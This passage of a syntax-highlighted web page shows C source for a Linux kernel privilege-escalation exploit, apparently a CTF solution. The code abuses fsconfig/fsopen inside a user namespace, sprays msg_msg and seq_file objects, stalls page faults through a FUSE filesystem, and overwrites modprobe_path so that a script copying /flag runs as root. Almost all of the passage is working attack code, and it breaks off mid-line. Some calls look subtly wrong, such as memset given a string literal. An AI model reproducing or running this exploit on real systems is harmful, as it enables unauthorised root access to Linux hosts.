class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FUSE_USE_VERSION 34</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fuse.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_COPY 040000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_QUEUE_NUM 0x50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEQ_FILE_NUM 0x100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_MSG_TYPE 0x41</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">long</span> m_type;</span><br><span class="line">    <span class="keyword">size_t</span> m_ts;    <span class="comment">/* message text size */</span></span><br><span class="line">    <span class="keyword">uint64_t</span> next;  <span class="comment">/* struct msg_msgseg *next; */</span></span><br><span class="line">    <span class="keyword">void</span> *security; <span class="comment">/* NULL without SELinux */</span></span><br><span class="line">    <span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_mod</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;mkdir -p /tmp&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;cp /flag /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/copy.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xFF\\xFF\\xFF\\xFF&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">uid_t</span> uid, <span class="keyword">gid_t</span> gid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(temp, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(temp);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> modprobe_path = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> exp_fs_fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *evil_path = <span class="string">&quot;evil&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">change_next</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fake_msg[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_list.next = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_list.prev = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_type = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;m_ts = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;next = modprobe_path;</span><br><span class="line">    ((struct msg_msg *)fake_msg)-&gt;security = *(<span class="keyword">uint64_t</span> *)<span class="string">&quot;0x196082&quot;</span>;</span><br><span class="line"></span><br><span class="line">    fsconfig(exp_fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, fake_msg + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[<span class="number">1</span>], <span class="string">&#x27;A&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_read</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *buf, <span class="keyword">size_t</span> size, <span class="keyword">off_t</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">              struct fuse_file_info *fi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> evil_buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">char</span> rev;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (offset &gt;= <span class="number">0x1000</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (offset + size &gt; <span class="number">0x1000</span>)</span><br><span class="line">        size = <span class="number">0x1000</span> - offset;</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(evil_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(evil_buf));</span><br><span class="line">    <span class="built_in">strcpy</span>(evil_buf, <span class="string">&quot;/tmp/shell.sh&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, evil_buf + offset, size);</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[<span class="number">0</span>], &amp;rev, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_getattr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, struct stat *stbuf,</span></span></span><br><span class="line"><span class="params"><span class="function">                 struct fuse_file_info *fi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(stbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct stat));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path, <span class="string">&quot;/&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        stbuf-&gt;st_mode = S_IFDIR | <span class="number">0755</span>;</span><br><span class="line">        stbuf-&gt;st_nlink = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path + <span class="number">1</span>, evil_path) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        stbuf-&gt;st_mode = S_IFREG | <span class="number">0666</span>;</span><br><span class="line">        stbuf-&gt;st_nlink = <span class="number">1</span>;</span><br><span class="line">        stbuf-&gt;st_size = <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        res = -ENOENT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evil_readdir</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">void</span> *buf, <span class="keyword">fuse_fill_dir_t</span> filler,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">off_t</span> offset, struct fuse_file_info *fi,</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">enum</span> fuse_readdir_flags flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(path, <span class="string">&quot;/&quot;</span>) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">    filler(buf, <span class="string">&quot;.&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    filler(buf, <span class="string">&quot;..&quot;</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    filler(buf, evil_path, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fuse_operations</span> <span class="title">evil_ops</span> =</span> &#123;</span><br><span class="line">    .getattr = evil_getattr,</span><br><span class="line">    .readdir = evil_readdir,</span><br><span class="line">    .read = evil_read,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg) + <span class="number">0x20</span> - <span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">&#125; primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr = <span class="number">-1</span>; <span class="comment">// single_start</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *evil_args[] = &#123;<span class="string">&quot;exploit&quot;</span>, <span class="string">&quot;./temp&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    evil_args[<span class="number">0</span>] = argv[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fs_fd[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">char</span> m_ts_buf[<span class="number">0x10</span>];</span><br><span class="line">    <span class="keyword">int</span> seq_fd[SEQ_FILE_NUM];</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    unshare_setup(getuid(), getgid());</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_fd) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] FAILED to open pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fork())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (fuse_main(<span class="keyword">sizeof</span>(evil_args) / <span class="keyword">sizeof</span>(<span class="keyword">char</span> *) - <span class="number">1</span>, evil_args,</span><br><span class="line">                      &amp;evil_ops, <span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;[-] FAILED to create FUSE!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ms_qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ms_qid &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&quot;\x00&quot;</span>, <span class="keyword">sizeof</span>(primary_msg) - <span class="keyword">sizeof</span>(<span class="keyword">long</span>));</span><br><span class="line">        ret = msgsnd(ms_qid, &amp;primary_msg, <span class="number">0xfd0</span> - <span class="number">8</span>, MSG_TAG);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error at sending msg_msg on %d queue\n&quot;</span>, i);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ret);</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (msqid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray msg_msg in half of message queues and seq_files...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM / <span class="number">2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;primary_msg.mtext, <span class="string">&#x27;A&#x27;</span> + i, <span 